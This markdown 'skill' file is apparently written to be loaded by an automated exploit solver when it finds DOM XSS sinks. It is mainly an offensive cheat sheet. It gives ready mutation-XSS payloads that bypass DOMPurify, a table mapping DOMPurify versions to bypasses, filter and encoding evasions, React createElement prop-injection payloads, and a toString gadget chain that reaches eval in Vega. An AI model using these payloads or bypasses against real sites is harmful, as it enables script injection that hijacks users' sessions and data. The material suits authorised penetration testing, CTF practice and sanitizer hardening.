---
name: xss
description: "DOM XSS exploitation techniques, mXSS, sanitizer bypasses, and gadget patterns. Load when a solver encounters innerHTML, document.write, eval, jQuery.html(), dangerouslySetInnerHTML, v-html, or other DOM XSS sinks."
---

# DOM XSS Exploitation Skill

## Sink priority

### Direct JS execution
- `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
- `new Worker('data:...')`, `new SharedWorker('data:...')`
- `import()` with user-controlled module specifier
- Service worker `importScripts()` with user-controlled domain (ref: PortSwigger — hijacking service workers via DOM clobbering)

### Document-level injection
- `document.write()`, `document.writeln()`
- `<iframe>.srcdoc`, `<base>.href` modification

### HTML parsing sinks
- `innerHTML`, `outerHTML`, `insertAdjacentHTML()`
- jQuery: `.html()`, `.append()`, `.prepend()`, `.after()`, `.before()`, `.replaceWith()`, `.wrap()`
- jQuery selector injection: `$('<img src=x onerror=alert(1)>')` — jQuery < 3.0 treats `<` strings as HTML
- React: `dangerouslySetInnerHTML`
- Angular: `bypassSecurityTrustHtml()`, `[innerHTML]` binding
- Vue: `v-html` directive

### URL/navigation sinks with javascript: protocol
- `location.href =`, `location.assign()`, `location.replace()`
- `window.open()`, `<a>.href` dynamic assignment

### Indirect / framework sinks
- `DOMParser.parseFromString()` → `adoptNode()`/`importNode()` into live DOM
- `document.createElement('script')` with dynamic `src` or `textContent`
- **React `createElement(type, props, children)` / `_jsx()` / `_jsxs()`** — if any argument from untrusted input, especially object spread to props (ref: Turb0 DEF CON 2025)
- **Implicit coercion** — `toString()`/`valueOf()` overrides on attacker objects, triggered by `+`, `~`, template literals (ref: CVE-2025-59840)

## Mutation XSS (mXSS) — the most powerful sanitizer bypass class

The browser's HTML parser mutates the DOM in ways the sanitizer didn't predict. Namespace confusion between HTML, SVG, and MathML is the root cause.

### Key CVEs and research

**CVE-2024-47875** — DOMPurify < 2.5.0 / < 3.1.3. Nesting-based mXSS using deeply nested HTML structures. Parser differential between DOMPurify's sanitization pass and the browser's re-parse on innerHTML assignment.

**CVE-2025-26791** — DOMPurify < 3.2.4. Incorrect template literal regex when `SAFE_FOR_TEMPLATES` is true.

**Securitum (Michał Bentkowski)** — DOMPurify 2.0.17 bypass. Namespace confusion with `<math>`, `<mtext>`, `<mglyph>`, `<style>`. The `mglyph` element switches namespace when a direct child of MathML text integration point, causing `<style>` to be parsed differently on re-serialization.

**PortSwigger (Gareth Heyes)** — Extended Bentkowski's bypass using HTML comments inside the namespace confusion chain. DOMPurify's patch checked text nodes but missed comments. Patched in DOMPurify 2.1.

**IcesFont** — DOMPurify 3.1.0 full bypass using novel nesting + form element + namespace transitions (documented at mizu.re).

### Namespace confusion explained
`<style>` in HTML namespace: raw text only, no children, entities NOT decoded.
`<style>` in SVG/MathML (foreign content): CAN have children, entities ARE decoded.
A payload safe in one namespace becomes dangerous when re-parsed in another.

### mXSS vectors to test
```
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```
```
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```
```
<math><mtext><table><mglyph><style><math><table id="</table>"><img src onerror=alert(1)">
```
```
<form><math><mtext></form><form><mglyph><svg><mtext><title><path is="</title><img src onerror=alert(origin)>">
```

### DOMPurify version → bypass lookup
| Version | Bypass |
|---------|--------|
| < 2.0.17 | Namespace confusion `<svg>` + `<style>` |
| < 2.1 | Comment-based mXSS in `<math><mtext><table><mglyph><style>` |
| < 2.5.0 / < 3.1.3 | CVE-2024-47875 nesting-based mXSS |
| < 3.2.4 | CVE-2025-26791 template literal regex |
| 3.2.6 (current) | Aggressive mXSS scrubbing + proto pollution hardening |

### DOMPurify config weaknesses
- `ALLOWED_TAGS` including `<svg>`, `<math>`, `<iframe>` — namespace confusion surface
- `ADD_ATTR` allowing `is=` — used in mXSS payloads
- `SAFE_FOR_TEMPLATES` — historically buggy
- Missing `FORBID_TAGS` for `<noscript>`, `<template>`

### Post-sanitization processing (common real-world pattern)
Code does `DOMPurify.sanitize(html)` then applies regex (e.g., removing `{{...}}` template syntax). The regex doesn't understand HTML context and can create new injection vectors by removing structurally important characters. Ref: Jorian Woltjer mXSS writeup.

## Custom sanitizer bypasses
- Nested tags: `<img/src/onerror=alert(1)>`
- Case: `<ScRiPt>`, `<SCRIPT>`
- Attribute without quotes: `<img src=x onerror=alert(1)>`
- Uncommon event handlers (PortSwigger cheat sheet 2026 edition):
  - `onscrollsnapchanging`, `onscrollsnapchange` — CSS scroll snap
  - `ontransitioncancel`, `ontransitionrun` — CSS transition via `:target`
  - `onanimationcancel` — requires `@keyframes` + `:target`
  - `oncuechange` on `<track>` inside `<video>` — rarely filtered
  - `onbeforeunload` with `navigator.sendBeacon()` for data exfil
  - `onscrollend` — fires after scroll completes

## Encoding bypasses
- Double URL encoding: `%253C` → `%3C` → `<`
- Unicode normalization: fullwidth chars `＜script＞`
- `javascript:` with whitespace injection: `java\tscript:`, `\njavascript:`
- `cid:` protocol — passes DOMPurify, doesn't URL-encode double quotes (used in DOM clobbering chains)
- Base64 data URIs: `data:text/html;base64,...`

## Framework-specific

### React — createElement as XSS sink (most hunters miss this)

Ref: Turb0 — "From Component to Compromised: XSS via React createElement" (DEF CON BBV 2025). Based on real bug bounty findings. Lab: https://defcon.turb0.one

**The core insight**: `dangerouslySetInnerHTML` is NOT the only React XSS sink. `createElement(type, props, children)` itself is a powerful sink when any argument comes from untrusted input.

#### createElement function signature
```javascript
React.createElement(type, props, ...children)
// In minified bundles: e.createElement(t, n, r) or _jsx(t, n) or _jsxs(t, n)
```

#### Attack surface per argument

**Type (1st arg)** — if attacker controls this as a string:
- Expected: a React component function/class
- Attacker sends: `"script"` or `"iframe"` or `"img"` → creates that HTML element directly
- Impact: combined with controlled props, creates arbitrary HTML elements with arbitrary attributes

**Props (2nd arg)** — if attacker controls object keys/values:
- `dangerouslySetInnerHTML: {__html: "<img src=x onerror=alert(1)>"}` — classic
- Event handlers: `{onError: "alert(1)"}` — if type is an HTML string element
- `href: "javascript:alert(1)"` — on anchor elements
- `srcdoc: "<script>alert(1)</script>"` — on iframe elements
- `style` object with CSS injection values

**Object spread to props** — the most common exploitable pattern in real apps:
```jsx
// Developer code (looks innocent):
function UserCard(props) {
  return <div {...apiResponse.settings} className="card">{props.name}</div>
}
// If apiResponse.settings comes from attacker-controlled data:
// {"dangerouslySetInnerHTML": {"__html": "<img src=x onerror=alert(1)>"}}
```
In compiled/minified bundle this becomes:
```javascript
createElement("div", Object.assign({}, apiResponse.settings, {className: "card"}), props.name)
```

**Children (3rd arg)** — limited in modern React (Symbols prevent JSON injection), but in ancient React (pre-2015 — `_isReactElement: true` check instead of Symbol) → arbitrary element injection from deserialized JSON.

#### Cheat sheet for createElement exploitation
Given attacker-controlled deserialized JSON reaching createElement:
- Full props control + string type → `dangerouslySetInnerHTML`, event handlers, `href="javascript:..."`
- Full props control + component type → can override any component prop, potentially triggering unsafe rendering
- Partial props control (object spread) → inject `dangerouslySetInnerHTML` alongside legitimate props
- Type control only → create `<script>`, `<iframe>`, `<object>`, `<embed>` elements (but need props too for full XSS)

#### Detection in minified code
```bash
# The call is always preserved (browser API)
grep -rn "\.createElement(" --include="*.js"
# Modern JSX runtime
grep -rn "_jsx(\|_jsxs(" --include="*.js"
# Object spread into props
grep -rn "Object\.assign({}," --include="*.js"
```

### React — other vectors
- `dangerouslySetInnerHTML` — the well-known escape hatch (still common)
- `href` with `javascript:` on `<a>` elements — React 16.9+ warns but doesn't block in all cases
- SSR hydration mismatch — server-rendered HTML differs from client, can create injection window
- Next.js `__NEXT_DATA__` → cache poisoning → stored XSS (PortSwigger Top 10 2025: "the stale elixir" by Rachid Allam)

### Angular
- Template injection `{{ }}` if user controls template string (Angular.js 1.x sandbox escapes — still found in legacy apps)
- `bypassSecurityTrustHtml()`, `bypassSecurityTrustScript()`, `bypassSecurityTrustUrl()` — developer misuse
- `[innerHTML]` binding — Angular sanitizer less battle-tested than DOMPurify

### Vue
- `v-html` directive — no sanitization at all
- `Vue.compile()` or `new Vue({template: userInput})` — template compilation with user input
- SSR hydration XSS similar to React

### jQuery (still extremely common in the wild)
- `$()` selector injection: `$('<img src=x onerror=alert(1)>')` — treated as HTML in jQuery < 3.0
- `.html()`, `.append()`, `.prepend()`, `.after()`, `.before()` with user input
- `$.parseHTML()` executes scripts in some configurations

## toString / valueOf gadget chains (implicit coercion XSS)

Ref: CVE-2025-59840 (Vega) by Turb0. A technique for achieving XSS through implicit type coercion — no explicit function call syntax needed.

### Mechanism
When JavaScript coerces an object to a primitive (via `+`, template literal, string concat), it calls `toString()` or `valueOf()`. If attacker controls an object and overrides `toString` with a "gadget function" — a function that internally calls `this.foo(this.bar)` — the attacker can achieve arbitrary function call.

### Pattern
```javascript
// Attacker-controlled object:
({
  toString: gadgetFunction,  // A function that calls this.something(this.otherThing)
  something: console.log,    // Controls what function is called
  otherThing: "arbitrary"    // Controls the argument
}) + 1  // Triggers toString → gadgetFunction → this.something(this.otherThing)
```

### Real-world exploit (CVE-2025-59840)
Vega visualization library evaluates expressions in a "secure" sandbox. By crafting an object with `toString` overridden to `VEGA_DEBUG.vega.CanvasHandler.prototype.on` (a function that calls `this._handlerIndex(this._handlers[...])`) and setting `_handlerIndex` to `window.eval`:
```javascript
({
  toString: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on,
  _handlers: {undefined: 'alert(origin)'},
  _handlerIndex: event.view.eval
}) + 1  // eval('alert(origin)') via toString chain
```

### WAF bypass applications
- `~{valueOf: someGlobalFunc}` — argumentless function call without parentheses or backticks
- Bypasses WAFs that block `()`, backticks, and common XSS syntax
- Any implicit coercion trigger works: `+`, `-`, `~`, `!`, template literals, comparisons

### When to look for this
- Expression sandbox / template engine that restricts direct function calls
- WAF blocks `()` and backticks
- User controls objects that get type-coerced (JSON deserialized → used in string operations)

## Reflected DOM XSS pattern
JSON response used with `eval()` — escape backslash not escaped. PortSwigger lab payload: `\"-alert(1)}//` — double-backslash cancels escaping, breaks out of JSON string.

## Key references
- PortSwigger XSS cheat sheet 2026: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PortSwigger DOM XSS: https://portswigger.net/web-security/cross-site-scripting/dom-based
- Turb0 React createElement research: https://www.turb0.one/pages/From_Component_to_Compromised:_XSS_via_React_createElement.html
- Turb0 CVE-2025-59840 toString gadgets: https://www.turb0.one/pages/Vega_CVE-2025-59840:_Unusual_XSS_Technique_toString_gadget_chains.html
- DOMPurify bypass timeline: https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
- Securitum mXSS: https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
- Jorian Woltjer mXSS: https://jorianwoltjer.com/blog/p/hacking/mutation-xss
- PortSwigger Top 10 2025: "Under the Beamer" — DOM clobbering + HTMLCollection + library node-removal gadget
- DOM Invader testing: https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss
